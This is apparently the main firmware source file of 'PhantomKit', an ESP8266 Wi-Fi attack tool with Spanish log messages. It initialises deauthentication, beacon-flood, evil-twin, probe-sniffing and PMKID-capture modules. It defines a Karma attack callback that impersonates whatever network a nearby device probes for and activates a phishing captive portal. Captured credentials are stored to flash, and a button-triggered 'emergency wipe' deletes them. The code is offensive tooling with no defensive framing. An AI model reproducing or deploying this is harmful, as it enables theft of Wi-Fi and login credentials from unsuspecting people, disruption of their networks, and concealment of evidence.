#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <LittleFS.h>
#include "config.h"
#include "wifi/ap_manager.h"
#include "wifi/dns_server.h"
#include "wifi/web_server.h"
#include "wifi/deauth.h"
#include "wifi/beacon_flood.h"
#include "wifi/probe_sniffer.h"
#include "wifi/evil_twin.h"
#include "wifi/auto_portal.h"
#include "wifi/channel_hopper.h"
#include "wifi/pmkid_capture.h"
#include "portal/captive_portal.h"
#include "portal/credential_store.h"
#include "notifier.h"

// Global state
String logBuffer = "";

// Module instances
APManager apManager;
PhantomDNSServer dnsServer;
NotifierModule notifier;
CredentialStore credStore(MAX_CREDENTIALS);
CaptivePortal captivePortal(credStore);
PhantomWebServer* webServer = nullptr;
ChannelHopper channelHopper;

// Attack modules
DeauthModule deauthModule;
BeaconFloodModule beaconModule;
ProbeSnifferModule probeModule;
EvilTwinModule evilTwinModule;
AutoPortalModule autoPortalModule;
PMKIDCaptureModule pmkidModule;

#include <time.h>

// ---------------------------------------------------------------------------
// Timestamp helpers
// ---------------------------------------------------------------------------

// Returns a formatted timestamp string.
// If NTP has synced (epoch > Jan 2024), returns "YYYY-MM-DD HH:MM:SS".
// Otherwise returns "T+HH:MM:SS" (time since boot).
static String getTimestamp() {
    time_t now = time(nullptr);
    if (now > 1704067200UL) {  // > 2024-01-01 00:00:00 UTC
        struct tm t;
        localtime_r(&now, &t);
        char buf[32];
        strftime(buf, sizeof(buf), "%Y-%m-%d %H:%M:%S", &t);
        return String(buf);
    }
    // Fallback: relative time since boot
    unsigned long secs = millis() / 1000;
    char buf[16];
    snprintf(buf, sizeof(buf), "T+%02lu:%02lu:%02lu",
             secs / 3600, (secs % 3600) / 60, secs % 60);
    return String(buf);
}

// Forward declaration (addLog is defined after karmaCallback)
void addLog(const String& msg);

// ---------------------------------------------------------------------------
// Karma Attack callback
// Called by ProbeSnifferModule when a new SSID probe is detected.
// Changes the softAP SSID to match the probed SSID and activates the portal
// with the best-fit template.
// ---------------------------------------------------------------------------
void karmaCallback(const String& ssid, int templateIdx) {
    addLog("[KARMA] Dispositivo buscando: " + ssid
           + " -> template: " + String(templateIdx));
    // Change AP SSID to match the probed SSID
    apManager.setSSID(ssid);
    apManager.restartAP();
    // Set best template
    captivePortal.setTemplate(templateIdx);
    // Activate portal
    captivePortal.setActive(true);
    addLog("[KARMA] Portal activo como: " + ssid);
}

void addLog(const String& msg) {
    logBuffer += "[" + getTimestamp() + "] " + msg + "\n";

    // Trim log buffer to MAX_LOGS lines
    int lines = 0;
    for (int i = 0; i < (int)logBuffer.length(); i++) {
        if (logBuffer[i] == '\n') lines++;
    }
    while (lines > MAX_LOGS) {
        int pos = logBuffer.indexOf('\n');
        if (pos == -1) break;
        logBuffer = logBuffer.substring(pos + 1);
        lines--;
    }

    Serial.println(msg);
}


void setup() {
    Serial.begin(115200);
    delay(1000);

    addLog("ESP8266 PhantomKit iniciando...");
    addLog("Version 1.3.0 - Auto-Attack, Karma, OUI, PMKID, Emergency Wipe");

    if (!LittleFS.begin()) {
        addLog("ERROR: LittleFS no se pudo montar");
    } else {
        addLog("LittleFS montado correctamente");
        credStore.loadFromDisk();
        addLog("Credenciales cargadas desde disco: " + String(credStore.getCount()));
        notifier.loadConfig();
    }

    // Uplink WiFi (AP+STA) for NTP and webhooks
    String uplinkSSID = String(UPLINK_SSID);
    if (uplinkSSID.length() > 0) {
        addLog("Conectando a uplink WiFi: " + uplinkSSID);
        WiFi.mode(WIFI_AP_STA);
        WiFi.begin(UPLINK_SSID, UPLINK_PASSWORD);

        unsigned long t0 = millis();
        while (WiFi.status() != WL_CONNECTED && millis() - t0 < 8000) {
            delay(250);
        }

        if (WiFi.status() == WL_CONNECTED) {
            addLog("Uplink WiFi conectado: " + WiFi.localIP().toString());
            // Sync NTP
            configTime(NTP_OFFSET, NTP_DST, NTP_SERVER, "time.cloudflare.com");
            addLog("Sincronizando NTP...");
            unsigned long t1 = millis();
            while (time(nullptr) < 1704067200UL && millis() - t1 < 5000) {
                delay(200);
            }
            if (time(nullptr) > 1704067200UL) {
                addLog("NTP sincronizado: " + getTimestamp());
            } else {
                addLog("NTP: sin respuesta, usando tiempo relativo");
            }
        } else {
            addLog("Uplink WiFi: no se pudo conectar, continuando sin internet");
        }
    } else {
        WiFi.mode(WIFI_AP);
    }

    apManager.begin(AP_SSID, AP_PASSWORD, AP_CHANNEL);
    addLog("WiFi AP iniciado: " + String(AP_SSID) + " Canal: " + String(AP_CHANNEL));

    dnsServer.begin(WiFi.softAPIP());
    addLog("DNS Server iniciado");
    
    channelHopper.begin(AP_CHANNEL);
    addLog("Channel Hopper iniciado");
    
    deauthModule.begin();
    beaconModule.begin();
    probeModule.begin();
    evilTwinModule.begin();
    autoPortalModule.begin();
    pmkidModule.begin();

    // GPIO emergency wipe setup
#if GPIO_WIPE_PIN >= 0
    pinMode(GPIO_WIPE_PIN, INPUT_PULLUP);
    addLog("GPIO Wipe: pin " + String(GPIO_WIPE_PIN) + " (mantener " + String(GPIO_WIPE_HOLD_MS / 1000) + "s)");
#endif
    
    webServer = new PhantomWebServer(credStore, captivePortal, apManager,
                                      deauthModule, beaconModule, probeModule,
                                      evilTwinModule, autoPortalModule, pmkidModule);
    webServer->begin();
    
    captivePortal.begin(webServer->getServer());
    
    addLog("Dashboard web: http://" + WiFi.softAPIP().toString() + "/dashboard");
    addLog("PhantomKit listo. Conectate a: " + String(AP_SSID));
}

void loop() {
    dnsServer.processNextRequest();
    
    if (webServer) {
        webServer->handleClient();
    }
    
    // Channel hopping
    channelHopper.update();
    
    // Update attack modules
    beaconModule.update();
    deauthModule.update();
    probeModule.update();
    evilTwinModule.update();

    // Auto-portal analysis
    if (autoPortalModule.isScanning()) {
        autoPortalModule.analyzeResults();
    }

    // GPIO Emergency Wipe (NodeMCU FLASH button)
#if GPIO_WIPE_PIN >= 0
    {
        static unsigned long wipePressStart = 0;
        if (digitalRead(GPIO_WIPE_PIN) == LOW) {
            if (wipePressStart == 0) wipePressStart = millis();
            else if (millis() - wipePressStart >= GPIO_WIPE_HOLD_MS) {
                addLog("!!! EMERGENCY WIPE ACTIVADO !!!");
                credStore.clear();
                LittleFS.remove("/credentials.csv");
                LittleFS.remove("/notify.cfg");
                delay(500);
                ESP.restart();
            }
        } else {
            wipePressStart = 0;
        }
    }
#endif

    delay(1);
}
